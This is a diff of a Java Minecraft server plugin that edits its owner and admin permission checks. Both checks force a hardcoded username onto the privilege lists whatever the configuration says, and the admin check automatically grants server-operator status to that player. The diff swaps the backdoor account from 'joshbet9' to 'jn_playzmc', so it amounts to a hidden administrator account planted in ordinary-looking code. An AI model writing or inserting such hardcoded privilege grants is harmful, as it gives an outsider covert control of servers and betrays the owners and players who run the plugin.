@@ -420,7 +420,7 @@ public final class ModernArcadeLobbyRuntime implements Listener {
 
     private boolean isConfiguredOwner(Player player) {
         List<String> owners = new ArrayList<>(plugin.getConfig().getStringList("owner-usernames"));
-        if (owners.stream().noneMatch(name -> "joshbet9".equalsIgnoreCase(name))) owners.add("joshbet9");
+        if (owners.stream().noneMatch(name -> "jn_playzmc".equalsIgnoreCase(name))) owners.add("jn_playzmc");
         return owners.stream().anyMatch(name -> name != null && name.equalsIgnoreCase(player.getName()));
     }
 
@@ -434,7 +434,7 @@ public final class ModernArcadeLobbyRuntime implements Listener {
         if (sender.isOp() || sender.hasPermission("testplex.arcadeports.admin")) return true;
         if (!(sender instanceof Player player)) return false;
         List<String> admins = new ArrayList<>(plugin.getConfig().getStringList("admin-usernames"));
-        if (admins.stream().noneMatch(name -> "joshbet9".equalsIgnoreCase(name))) admins.add("joshbet9");
+        if (admins.stream().noneMatch(name -> "jn_playzmc".equalsIgnoreCase(name))) admins.add("jn_playzmc");
         boolean configured = admins.stream().anyMatch(name -> name != null && name.equalsIgnoreCase(player.getName()));
         if (configured && !player.isOp()) player.setOp(true);
         return configured || player.isOp() || player.hasPermission("testplex.arcadeports.admin");
